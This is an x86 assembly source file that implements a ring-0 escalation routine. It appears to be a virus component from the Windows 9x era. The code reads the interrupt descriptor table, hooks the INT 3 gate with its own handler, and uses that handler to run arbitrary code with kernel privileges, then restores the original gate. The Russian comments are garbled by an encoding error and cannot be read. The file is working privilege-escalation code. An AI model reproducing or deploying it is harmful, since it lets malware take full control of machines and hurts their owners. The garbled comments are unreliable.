;
;            �����ۿ   �ۿ  ��ۿ �ۿ  �����ۿ     ����ۿ
;            ����Ĳ��  ���  �������� ��������    ����Ĳ��
;            ��������  ���  ��ڱ���� ��� ����    ��������
;            ��ڰ���   ���  �������� ��� ����    ����ٰ��
;            �������   ���  ��� ���� ��������    ��������
;            ��� ���   ���  ���  ���  �������     ������
;
;����������������������������������������������������������������������������
open_RING0_function:
        pushad
        call     init_open_RING0_function
init_open_RING0_function:
        pop      ebp
        sub      ebp,offset (init_open_RING0_function-open_RING0_function)
        sub      esp,4
        sidt     fword ptr [esp-02]
        ;������� ��p��� IDT
        pop      ebx
        add      ebx,3*8h
        cli
        ;��p�� ��p� ��p����稪 �p�p뢠��� INT 3
        mov      edi,[ebx+4]
        mov      di,[ebx]
        ;H�� ��p����稪 INT 3
        lea      esi,[ebp+obr_INT3-open_RING0_function]
        mov      [ebx],si     ;��p��� �������� ᬥ饭�� ��p����稪� INT3
        shr      esi,10h
        mov      [ebx+06],si  ;��p�� �������� ᬥ饭�� ��p����稪� INT3
        ;�室: EDI - ��p� ��p����稪
        ;      EBX - ������� ��p��� ���p���p� INT 3
        mov      ax,01h
        int      3h
        popad
        retn
;����������������������������������������������������������������������������
;����騥 �㭪樨:
;AX = 1 - ���樠������ RING0_function
;�室: EDI - ��p� ��p����稪
;      EBX - ������� ��p��� ���p���p� INT 3
;AX = 2 - ��p��� ��p����稪 �㭪権 RING3 (�p� ��室�)
;AX = 3 - �믮����� ����p��p���� ��� ������ RING 0
;�室: EDI - ᬥ饭�� ����p��p����
obr_INT3:
        push     ebp
        call     init_obr_INT3
init_obr_INT3:
        pop      ebp
        sub      ebp,offset (init_obr_INT3-obr_INT3)
        ;����� ����� ��p������� ᢮� �㭪樨 RING0
        cmp      ax,01h ;���樠������ �㭪権 RING0 (�� �ᯮ�짮����)
        jz       init_RING0_function
        cmp      ax,02h ;Remove RING 0 �㭪権
        jz       remove_RING0_function
        cmp      ax,03h
        jz       call_RING0
function_complite:
        pop      ebp
function_complite_without_popebp:
        iretd
init_RING0_function:
        mov      dword ptr [ebp+old_IN3_base_addr-obr_INT3],edi
        mov      dword ptr [ebp+IDT_base_addr-obr_INT3],ebx
        jmp      function_complite
remove_RING0_function:
        push     ebx esi
        mov      ebx,dword ptr [ebp+IDT_base_addr-obr_INT3]
        mov      esi,dword ptr [ebp+old_IN3_base_addr-obr_INT3]
        mov      [ebx],si
        shr      esi,10h
        mov      [ebx+06],si
        pop      esi ebx
        jmp      function_complite
call_RING0:
        pop      ebp
        call     edi
        jmp      function_complite_without_popebp
old_IN3_base_addr dd 0
IDT_base_addr     dd 0
;����������������������������������������������������������������������������
